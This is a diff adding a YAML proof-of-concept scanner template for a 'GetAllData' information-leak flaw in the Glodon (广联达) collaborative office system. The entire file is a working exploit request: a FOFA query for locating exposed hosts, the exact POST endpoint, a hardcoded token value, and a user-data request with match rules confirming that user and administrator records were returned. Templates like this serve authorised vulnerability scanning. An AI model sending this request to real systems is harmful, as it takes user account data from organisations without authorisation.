@@ -1,0 +1,18 @@
+id: poc-yaml-glinkworks-GetAllData-sensitive-information-leak
+info:
+  name: 广联达协同办公系统 GetAllData 敏感信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: 广联达协同办公系统
+  fofa: body="Services/Identification/login.ashx"
+requests:
+- method: POST
+  path: /WebService/Lk6SyncService/MrMMSSvc/DataSvc.asmx/GetAllData
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: Token=!@#$asdf$#@!&DataType=user
+  expression: status_code == 200 && contains(headers,"text/xml") && contains(body,"USR_ID")
+    && contains(body,"管理员") && contains(body,"<Result>ok</Result>")
+variables: {}
+transport: http
